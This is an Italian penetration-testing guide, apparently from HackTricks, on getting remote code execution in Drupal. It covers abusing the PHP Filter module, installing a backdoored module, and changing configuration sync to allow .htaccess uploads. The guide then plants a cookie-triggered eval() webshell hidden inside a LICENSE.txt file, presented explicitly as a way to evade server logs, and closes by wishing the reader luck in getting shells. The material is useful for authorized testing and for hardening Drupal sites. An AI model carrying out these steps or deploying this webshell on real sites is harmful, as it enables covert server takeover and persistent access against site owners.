# Drupal RCE

{{#include ../../../banners/hacktricks-training.md}}

## Con il modulo PHP Filter

> [!WARNING]
> Nelle versioni più vecchie di Drupal **(prima della versione 8)**, era possibile accedere come admin e **abilitare il modulo `PHP filter`**, che "Consente di valutare codice/snippet PHP incorporati." Ma dalla versione 8 questo modulo non è installato per impostazione predefinita.

1. Vai a **/modules/php** e se viene restituito un errore 403 allora il **plugin PHP filter è installato e puoi continuare**
1. Se no, vai su `Modules` e seleziona la casella di `PHP Filter` e poi su `Save configuration`
2. Poi, per sfruttarlo, clicca su `Add content`, poi seleziona `Basic Page` o `Article` e scrivi il **PHP backdoor**, poi seleziona `PHP` come formato di testo e infine seleziona `Preview`
3. Per attivarlo, accedi semplicemente al nodo appena creato:
```bash
curl http://drupal.local/node/3
```
## Installa il modulo PHP Filter

> [!WARNING]
> Nelle versioni attuali non è più possibile installare plugin avendo accesso solo al web dopo l'installazione predefinita.

Dalla versione **8 in poi, il** [**PHP Filter**](https://www.drupal.org/project/php/releases/8.x-1.1) **modulo non è installato di default**. Per sfruttare questa funzionalità, dovremmo **installare il modulo noi stessi**.

1. Scarica l'ultima versione del modulo dal sito web di Drupal.
1. `wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz`
2. Una volta scaricato, vai su **`Amministrazione`** > **`Report`** > **`Aggiornamenti disponibili`**.
3. Clicca su **`Sfoglia`**, seleziona il file dalla directory in cui lo abbiamo scaricato e poi clicca su **`Installa`**.
4. Una volta installato il modulo, possiamo cliccare su **`Contenuto`** e **creare una nuova pagina base**, simile a come abbiamo fatto nell'esempio di Drupal 7. Ancora una volta, assicurati di **selezionare `Codice PHP` dal menu a discesa `Formato testo`**.

## Modulo con backdoor

> [!WARNING]
> Nelle versioni attuali non è più possibile installare plugin avendo accesso solo al web dopo l'installazione predefinita.

Era possibile **scaricare** un **modulo**, aggiungere una **backdoor** e **installarlo**. Ad esempio, scaricando il modulo [**Trurnstile**](https://www.drupal.org/project/turnstile) in formato compresso, creando un nuovo file PHP di backdoor al suo interno, consentendo l'accesso al file PHP con un file `.htaccess`:
```html
<IfModule mod_rewrite.c> RewriteEngine On RewriteBase / </IfModule>
```
E poi andare su **`http://drupal.local/admin/modules/install`** per installare il modulo backdoored e accedere a **`/modules/turnstile/back.php`** per eseguirlo.

## Backdooring Drupal con la sincronizzazione della configurazione <a href="#backdooring-drupal" id="backdooring-drupal"></a>

**Post condiviso da** [**Coiffeur0x90**](https://twitter.com/Coiffeur0x90)

### Parte 1 (attivazione di _Media_ e _Media Library_)

Nel menu _Estendi_ (/admin/modules), puoi attivare quelli che sembrano essere plugin già installati. Per impostazione predefinita, i plugin _Media_ e _Media Library_ non sembrano essere attivati, quindi attiviamoli.

Prima dell'attivazione:

<figure><img src="../../../images/image (4) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Dopo l'attivazione:

<figure><img src="../../../images/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (2) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Parte 2 (sfruttare la funzionalità _Sincronizzazione della configurazione_) <a href="#part-2-leveraging-feature-configuration-synchronization" id="part-2-leveraging-feature-configuration-synchronization"></a>

Sfrutteremo la funzionalità _Sincronizzazione della configurazione_ per scaricare (esportare) e caricare (importare) le voci di configurazione di Drupal:

- /admin/config/development/configuration/single/export
- /admin/config/development/configuration/single/import

**Patch system.file.yml**

Iniziamo patchando la prima voce `allow_insecure_uploads` da:

File: system.file.yml
```

...

allow_insecure_uploads: false

...

```
<figure><img src="../../../images/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

A:

File: system.file.yml
```

...

allow_insecure_uploads: true

...

```
<figure><img src="../../../images/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Patch field.field.media.document.field_media_document.yml**

Poi, patcha la seconda voce `file_extensions` da: 

File: field.field.media.document.field_media_document.yml
```

...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...
```
<figure><img src="../../../images/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

A:

File: field.field.media.document.field_media_document.yml
```
...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'htaccess txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...

```
> Non lo uso in questo post del blog, ma è importante notare che è possibile definire l'entry `file_directory` in modo arbitrario e che è vulnerabile a un attacco di path traversal (quindi possiamo risalire all'interno dell'albero del filesystem di Drupal).

<figure><img src="../../../images/image (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Parte 3 (sfruttando la funzionalità _Aggiungi Documento_) <a href="#part-3-leveraging-feature-add-document" id="part-3-leveraging-feature-add-document"></a>

L'ultimo passaggio è il più semplice e si suddivide in due sotto-passaggi. Il primo è caricare un file in formato .htaccess per sfruttare le direttive di Apache e consentire ai file .txt di essere interpretati dal motore PHP. Il secondo è caricare un file .txt contenente il nostro payload.

File: .htaccess
```
<Files *>
SetHandler application/x-httpd-php
</Files>

# Vroum! Vroum!
# We reactivate PHP engines for all versions in order to be targetless.
<IfModule mod_php.c>
php_flag engine on
</IfModule>
<IfModule mod_php7.c>
php_flag engine on
</IfModule>
<IfModule mod_php5.c>
php_flag engine on
</IfModule>
```
Perché questo trucco è interessante?

Perché una volta che il Webshell (che chiameremo LICENSE.txt) è stato caricato sul server Web, possiamo trasmettere i nostri comandi tramite `$_COOKIE` e nei log del server Web, questo apparirà come una legittima richiesta GET a un file di testo.

Perché chiamare il nostro Webshell LICENSE.txt?

Semplicemente perché se prendiamo il seguente file, ad esempio [core/LICENSE.txt](https://github.com/drupal/drupal/blob/11.x/core/LICENSE.txt) (che è già presente nel core di Drupal), abbiamo un file di 339 righe e 17,6 KB di dimensione, che è perfetto per aggiungere un piccolo frammento di codice PHP nel mezzo (dato che il file è abbastanza grande).

<figure><img src="../../../images/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

File: Patched LICENSE.txt
```txt

...

this License, you may choose any version ever published by the Free Software
Foundation.

<?php

# We inject our payload into the cookies so that in the logs of the compromised
# server it shows up as having been requested via the GET method, in order to
# avoid raising suspicions.
if (isset($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
if (!empty($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
eval($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"]);
} else {
phpinfo();
}
}

?>

10. If you wish to incorporate parts of the Program into other free
programs whose distribution conditions are different, write to the author

...

```
#### **Parte 3.1 (carica il file .htaccess)**

Prima, sfruttiamo la funzione _Add Document_ (/media/add/document) per caricare il nostro file contenente le direttive Apache (.htaccess).

<figure><img src="../../../images/image (8) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (9) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (10) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Parte 3.2 (carica il file LICENSE.txt)**

Poi, sfruttiamo di nuovo la funzione _Add Document_ (/media/add/document) per caricare un Webshell nascosto all'interno di un file di licenza.

<figure><img src="../../../images/image (11) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (12) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../images/image (13) (1).png" alt=""><figcaption></figcaption></figure>

### Parte 4 (interazione con il Webshell) <a href="#part-4-interaction-with-the-webshell" id="part-4-interaction-with-the-webshell"></a>

L'ultima parte consiste nell'interagire con il Webshell.

Come mostrato nello screenshot seguente, se il cookie previsto dal nostro Webshell non è definito, otteniamo il risultato successivo quando consultiamo il file tramite un browser Web.

<figure><img src="../../../images/image (14) (1).png" alt=""><figcaption></figcaption></figure>

Quando l'attaccante imposta il cookie, può interagire con il Webshell ed eseguire qualsiasi comando desideri.

<figure><img src="../../../images/image (15) (1).png" alt=""><figcaption></figcaption></figure>

E come puoi vedere nei log, sembra che sia stato richiesto solo un file txt.

<figure><img src="../../../images/image (16) (1).png" alt=""><figcaption></figcaption></figure>

Grazie per aver dedicato del tempo a leggere questo articolo, spero che ti aiuti a ottenere alcune shell.

{{#include ../../../banners/hacktricks-training.md}}
